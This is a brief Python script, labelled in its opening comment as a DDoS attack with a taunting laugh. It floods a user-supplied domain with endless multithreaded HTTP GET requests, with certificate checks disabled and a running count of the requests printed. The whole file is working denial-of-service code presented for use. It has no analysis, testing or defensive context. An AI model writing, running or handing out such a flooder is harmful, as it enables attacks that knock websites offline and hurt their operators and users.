#DDOS ATTACK HAAHAAHHA
import threading,requests,argparse,time,socket,urllib3
parser = argparse.ArgumentParser()
parser.add_argument('-d','--domain',metavar='',help='Domain to send request')
parser.add_argument('-t','--threads',metavar='',help='Number of Threads')
args = parser.parse_args()
count = 0
class Request(threading.Thread):
    def __init__(self,domain,threads):
        threading.Thread.__init__(self)
        self.domain = domain
        self.threads = threads
    def request(self):
        try:
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("8.8.8.8", 53))
                req_func = lambda req: requests.get(req,verify=False)
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                req = req_func(self.domain)
                global count
                count+=1
                if req.status_code == 200 or req.status_code != 400:
                    print(f"({count})[{req.status_code}]Request->{self.domain}")
                elif req.status_code >= 400:
                    print(f"({count})[{req.status_code}]Failed Request->{self.domain}")
                elif s != "None":
                    print("No Internet Connection.")
        except Exception as Err:
            print(Err)

if __name__ == '__main__':
    threads = []
    for i in range(int(args.threads)):
        thread_class = Request(args.domain,args.threads)
        thread_request = threading.Thread(target=thread_class.request)
        thread_request.daemon = True
        threads.append(thread_request)
    for i in range(int(args.threads)):
        threads[i].start()
    for i in range(int(args.threads)):
        threads[i].join()
